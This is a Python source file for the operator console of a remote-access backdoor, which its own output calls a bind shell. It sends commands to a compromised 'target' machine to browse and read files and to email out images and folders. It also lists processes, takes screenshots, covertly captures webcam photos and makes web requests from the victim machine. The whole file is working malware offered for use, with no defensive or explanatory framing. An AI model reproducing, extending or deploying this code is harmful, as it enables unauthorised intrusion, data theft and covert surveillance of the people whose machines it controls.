import os
class Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def listening(self):
        import socket   # For Establishing Socket Connection
        from colorama import Fore, Style    # For Styling
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((socket.gethostbyname(socket.gethostname()), self.port ))
        sock.listen(3)
        print("")
        print(
            f"Server is currently listening at {Fore.YELLOW}{self.host}{Style.RESET_ALL}")
        print("")
        conn, addr = sock.accept()
        print(
            f"{Fore.CYAN}BIND SHELL ESTABLISHED WITH{Style.RESET_ALL} {Fore.RED}{addr}{Style.RESET_ALL} ")
        print("")
        while True:
            command = str(input("Command >> "))

            if command == "cwd":    # For printing current working directory
                command = command.lower()
                conn.send(command.encode())
                files = conn.recv(5000)
                files = files.decode()
                print(f"{Fore.CYAN}Command Output:{Style.RESET_ALL} {files}")

            elif command == "dir" or command == "ls":    # For listing content of a directory
                command = command.lower()
                conn.send(command.encode())
                files = conn.recv(5000)
                files = files.decode()
                print(f"{Fore.CYAN}Command Output:{Style.RESET_ALL} {files}")

            elif command == "cd":     # For changing directory
                name = input("To What?")
                command = f"cd*{name}"
                conn.send(command.encode())
                files = conn.recv(5000)
                files = files.decode()
                print(f"{Fore.CYAN}Command Output:{Style.RESET_ALL} {files}")

            elif command == "drive":     # For changing drive.
                name = input("Drive letter : ")
                command = f"drive {name}"
                conn.send(command.encode())
                files = conn.recv(5000)
                files = files.decode()
                print(files)

            elif command == "readlines":     # For reading a text file
                name = input("Specify the file name : ")
                command = f"readlines*{name}"
                conn.send(command.encode())
                files = conn.recv(5000)
                files = files.decode()
                print(f"{Fore.CYAN}Command Output:{Style.RESET_ALL} {files}")

            elif command == "nul > ":      # For creating a text file
                name = input("Enter the name of the text file : ")
                content = input("Enter the content : ")
                command = f"nul > *{name}*{content}"
                conn.send(command.encode())
                files = conn.recv(5000)
                files = files.decode()
                print(f"{Fore.CYAN}Command Output:{Style.RESET_ALL} {files}")

            elif command == "image":     # For receiving any of the target's picture via an email attachment.
                path = input("Enter the path including the image name : ")
                name = input("Enter only name of the file : ")
                command = f"image*{path}*{name}"
                conn.send(command.encode())
                files = conn.recv(5000)
                files = files.decode()
                print(f"{Fore.CYAN}Command Output:{Style.RESET_ALL} {files}")

            elif command == "folder":   # For receiving any of the target's folder via an email attachment.
                path = input("Enter path to the folder without folder name.")
                fullpath = input("Enter path to the folder with folder name")
                command = f"folder*{path}*{fullpath}"
                conn.send(command.encode())
                files = conn.recv(5000)
                files = files.decode()
                print(f"{Fore.CYAN}Command Output:{Style.RESET_ALL} {files}")

            elif command == "cd ..":    # For jumping one directory back
                conn.send(command.encode())
                files = conn.recv(5000)
                files = files.decode()
                print(f"{Fore.CYAN}Command Output:{Style.RESET_ALL} {files}")

            elif command == "cd ../..":     # For jumping two directories back in client's machine.
                conn.send(command.encode())
                files = conn.recv(5000)
                files = files.decode()
                print(f"{Fore.CYAN}Command Output:{Style.RESET_ALL} {files}")

            elif command in ['exit', 'exit()', 'break']:    # For breaking the connection
                confirmation = input("Are you sure you want to exit this shell?\n")
                if confirmation == "yes":    
                    print("Exiting the backdoor")
                    conn.send(command.encode())
                    exit()
                else:
                    print("That's why I asked you")


            elif command == "mkdir":      # For making a directory 
                name = str(input("Enter directory name : "))
                command = f"mkdir {name}"
                conn.send(command.encode())
                files = conn.recv(5000)
                files = files.decode()
                print(files)

            elif command == "get request":      # For making a GET request
                command = command.lower()
                url = input("Enter the url : ")
                r = str(input("Response Type = 1. content or 2. status :  ")).lower()
                command = f"get request*{url}*{r}"
                conn.send(command.encode())
                files = conn.recv(5000)
                files = files.decode()
                print(files)

            elif command == "post request":     # For making a POST request
                url = str(input("Enter the url : "))
                data = input("Enter data to send : ")
                command = f"post request*{url}*{data}"
                conn.send(command.encode())
                files = conn.recv(5000)
                files = files.decode()
                print(files)

            elif command == "tasklist":     # For getting the list of running processes on client's machine.
                conn.send(command.encode())
                files = conn.recv(5000)
                files = files.decode()
                print(files)

            elif command == "clear":    # For clearning the terminal
                os.system('cls' if os.name == 'nt' else 'clear')

            elif command == "screenshot":   # For getting a mail of a screenshot captured from client's machine.
                name = str(input("Enter name with format : "))
                command = f"screenshot {name}"
                conn.send(command.encode())
                files = conn.recv(5000)
                files = files.decode()
                print(files)

            elif command == "webcam":   # For getting a mail of picture captured from the client's webcam.
                name = str(input("Enter the name with format : "))
                command = f"webcam {name}"
                conn.send(command.encode())
                files = conn.recv(5000)
                files = files.decode()
                print(files)

            elif "print" in command:    # For Printing anything in the terminal
                conn.send(command.encode())
                files = conn.recv(5000)
                files = files.decode()
                print(files)

            else:
                print("Invalid Command!")

Kabeer = Server("192.168.10.10", 8081)  # Change this IP to your current IP and Port Number to whatever you like.
Kabeer.listening()
